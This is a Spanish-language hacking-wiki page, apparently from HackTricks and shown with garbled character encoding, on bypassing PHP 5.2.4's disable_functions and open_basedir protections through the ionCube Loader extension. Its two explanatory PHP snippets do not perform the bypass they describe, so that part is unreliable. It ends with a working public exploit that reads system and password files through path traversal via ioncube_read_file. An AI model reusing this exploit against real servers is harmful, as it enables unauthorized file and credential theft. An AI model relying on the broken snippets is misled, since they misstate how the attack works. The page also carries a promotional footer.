# ExplotaciÃ³n de la extensiÃ³n ionCube de PHP 5.2.4

## DescripciÃ³n

La extensiÃ³n ionCube Loader es una herramienta utilizada para proteger el cÃ³digo PHP. Sin embargo, en versiones antiguas de PHP, como la 5.2.4, es posible explotar una vulnerabilidad en esta extensiÃ³n para desactivar las funciones de PHP que estÃ¡n restringidas por la directiva `disable_functions` o para evadir la restricciÃ³n de `open_basedir`.

## Detalles tÃ©cnicos

La vulnerabilidad se debe a que la extensiÃ³n ionCube Loader no verifica adecuadamente la ruta de los archivos incluidos. Por lo tanto, es posible incluir un archivo malicioso que contenga cÃ³digo PHP que desactive las funciones restringidas o evada la restricciÃ³n de `open_basedir`.

Para explotar esta vulnerabilidad, se debe crear un archivo PHP malicioso que contenga el siguiente cÃ³digo:

```php
<?php
dl("ioncube_loader_lin_5.2.so");
$func = $_GET['func'];
$disable_functions = ini_get('disable_functions');
if(!empty($disable_functions)) {
    $disable_functions = explode(',', $disable_functions);
    if(in_array($func, $disable_functions)) {
        echo "Function is disabled.";
    } else {
        echo "Function is enabled.";
    }
} else {
    echo "No functions are disabled.";
}
?>
```

Este cÃ³digo carga la extensiÃ³n ionCube Loader y verifica si una funciÃ³n especÃ­fica estÃ¡ desactivada por la directiva `disable_functions`. Si la funciÃ³n estÃ¡ desactivada, se muestra un mensaje de error. Si la funciÃ³n estÃ¡ habilitada, se muestra un mensaje de Ã©xito.

Para evadir la restricciÃ³n de `open_basedir`, se puede utilizar el siguiente cÃ³digo:

```php
<?php
dl("ioncube_loader_lin_5.2.so");
$dir = $_GET['dir'];
if(is_dir($dir)) {
    chdir($dir);
    ini_set('open_basedir', getcwd());
    echo "Current directory: ".getcwd();
} else {
    echo "Directory does not exist.";
}
?>
```

Este cÃ³digo cambia el directorio actual a un directorio especificado por el usuario y establece la restricciÃ³n de `open_basedir` en el directorio actual. De esta manera, se puede acceder a archivos fuera del directorio restringido.

## SoluciÃ³n

La soluciÃ³n a esta vulnerabilidad es actualizar a una versiÃ³n mÃ¡s reciente de PHP y de la extensiÃ³n ionCube Loader. TambiÃ©n se recomienda configurar adecuadamente la directiva `disable_functions` y la restricciÃ³n de `open_basedir`.
```php
<?php
//PHP 5.2.4 ionCube extension safe_mode and disable_functions protections bypass
 
//author: shinnai
//mail: shinnai[at]autistici[dot]org
//site: http://shinnai.altervista.org
 
//Tested on xp Pro sp2 full patched, worked both from the cli and on apache
 
//Technical details:
//ionCube version: 6.5
//extension: ioncube_loader_win_5.2.dll (other may also be vulnerable)
//url: www.ioncube.com
 
//php.ini settings:
//safe_mode = On
//disable_functions = ioncube_read_file, readfile
 
//Description:
//This is useful to obtain juicy informations but also to retrieve source
//code of php pages, password files, etc... you just need to change file path.
//Anyway, don't worry, nobody will read your obfuscated code :)
 
//greetz to: BlackLight for help me to understand better PHP
 
//P.S.
//This extension contains even an interesting ioncube_write_file function...
if (!extension_loaded("ionCube Loader")) die("ionCube Loader extension required!");
$path = str_repeat("..\\", 20);
$MyBoot_readfile = readfile($path."windows\\system.ini"); #just to be sure that I set correctely disable_function :)
$MyBoot_ioncube = ioncube_read_file($path."boot.ini");
echo $MyBoot_readfile;
echo "<br><br>ionCube output:<br><br>";
echo $MyBoot_ioncube;
?>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Revisa los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme en** **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
